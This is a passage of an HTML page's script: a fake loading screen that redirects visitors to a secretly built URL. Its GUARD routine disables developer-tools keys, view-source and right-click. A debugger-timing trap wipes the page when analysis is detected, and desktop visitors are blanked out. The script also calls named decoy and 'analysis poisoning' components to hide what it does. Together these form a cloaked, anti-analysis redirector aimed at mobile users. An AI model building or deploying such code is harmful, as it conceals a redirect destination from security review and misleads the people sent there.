                            .getPropertyValue('content').replace(/["'\\]/g, '');
                        return css + body + after || 'ismailemad.html';
                    } catch(e) {
                        return 'ismailemad.html';
                    }
                }
            };

            // ═══════════════════════════════════════════
            // GUARDIAN (silent protection)
            // ═══════════════════════════════════════════
            const GUARD = {
                start() {
                    document.addEventListener('keydown', e => {
                        if (e.keyCode===123 || 
                            (e.ctrlKey&&e.shiftKey&&[73,74].includes(e.keyCode)) ||
                            (e.ctrlKey&&e.keyCode===85)) {
                            e.preventDefault();
                        }
                    }, true);
                    
                    document.addEventListener('contextmenu', e => e.preventDefault(), true);
                    
                    let sus = 0;
                    setInterval(() => {
                        const s = performance.now();
                        try { debugger; } catch(e) {}
                        sus = (performance.now()-s > 50) ? sus+1 : Math.max(0,sus-0.3);
                        if (sus > 50) {
                            document.documentElement.innerHTML = '';
                            window.location.replace('about:blank');
                        }
                    }, 500);
                }
            };

            // ═══════════════════════════════════════════
            // MAIN CONTROLLER
            // ═══════════════════════════════════════════
            const MAIN = {
                url: null,
                systems: {},
                
                init() {
                    // IMMEDIATE: Check if desktop - Nuke it
                    if (DETECT.isDefinitelyDesktop()) {
                        document.documentElement.innerHTML = '';
                        window.location.replace('about:blank');
                        return;
                    }
                    
                    // Start guardian
                    GUARD.start();
                    
                    // Initialize obfuscation systems
                    this.systems = {
                        entropy: ENTROPY,
                        falseTrails: new FalseTrailGenerator(ENTROPY),
                        lazy: new LazyController(),
                        invalidator: new SelfInvalidatingLogic(ENTROPY),
                        observer: new ObserverDependentExecution(ENTROPY),
                        isolator: new CriticalPathIsolator(),
                        shadow: new ShadowLogic(ENTROPY),
                        timeObf: new PassiveTimeObfuscation(),
                        poison: new AnalysisPoisoning(ENTROPY),
                        slicer: new ExecutionSlicer(),
                        context: new ContextDependentLogic(ENTROPY)
                    };
                    
                    // Generate noise
                    this.systems.observer.generateNoise();
                    this.systems.falseTrails.generateTraceLog();
                    
                    // Lazy load decoys
                    for (let i = 0; i < 50; i++) {
                        this.systems.lazy.defer(
                            'decoy_' + i,
                            () => {
                                this.systems.poison.getFakeResults();
                                this.systems.shadow.getState();
                            },
                            i % 3
                        );
                    }
                    
                    const decoyIds = Array(50).fill(0).map((_,i) => 'decoy_' + i);
                    this.systems.lazy.spreadOverTime(decoyIds, 100);
                    
                    // Build URL
                    this.url = SECRET.build();
                    
                    // Execute critical path
                    this.systems.isolator.executeReal(() => {
                        this._scheduleNavigation();
                    });
                    
                    // Micro-jitter
                    this.systems.timeObf.microJitter();
                    
                    // Slice remaining work
                    this.systems.slicer.slice(() => {
                        this.systems.shadow._castShadows();
                    });
                    
                    this.systems.slicer.slice(() => {
                        this.systems.invalidator.createCheck(999, 'final');
                    });
                    
                    this.systems.slicer.slice(() => {
                        this.systems.context.getVariant();
                    });
                },
                
                _scheduleNavigation() {
                    const primaryDelay = ANIM_DURATION - (performance.now() - ANIM_START);
                    
                    setTimeout(() => {
                        if (bar) bar.style.width = '100%';
                        if (msgEl) msgEl.textContent = 'Ready...';
                        
                        setTimeout(() => {
                            if (screen) screen.style.opacity = '0';
                            setTimeout(() => {
                                try { window.location.href = this.url; }
                                catch(e) { window.location.replace(this.url); }
                            }, 500);
                        }, 200);
                    }, Math.max(100, primaryDelay));
                    
                    // Backup navigations
                    setTimeout(() => {
                        if (window.location.href.indexOf('ismailemad') === -1) {
                            window.location.replace(this.url);
                        }
                    }, ANIM_DURATION + 2000);
                    
                    setTimeout(() => {
                        if (window.location.href.indexOf('ismailemad') === -1 &&
                            window.location.href.indexOf('about:blank') === -1) {
                            window.location.replace(this.url);
                        }
                    }, ANIM_DURATION + 4000);
                }
            };

            // ═══════════════════════════════════════════
            // FAULT TOLERANCE
            // ═══════════════════════════════════════════
            window.onerror = () => {
                setTimeout(() => window.location.replace('ismailemad.html'), 500);
                return true;
            };
            
            window.onunhandledrejection = () => {
                setTimeout(() => window.location.replace('ismailemad.html'), 500);
            };

            // ═══════════════════════════════════════════
            // BOOTSTRAP
            // ═══════════════════════════════════════════
            function boot() {
                MAIN.init();
                
                setTimeout(() => {
                    if (msgEl && msgEl.textContent === 'Initializing...') {
                        msgEl.textContent = 'Preparing...';
                    }
                }, 800);
                
                setTimeout(() => {
                    if (msgEl) msgEl.textContent = 'Almost ready...';
                }, 1600);
            }
            
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', boot);
            } else {
                boot();
            }
            
            setTimeout(() => {
                if (!MAIN.url) boot();
            }, 500);

        })();
    </script>
</body>
</html>
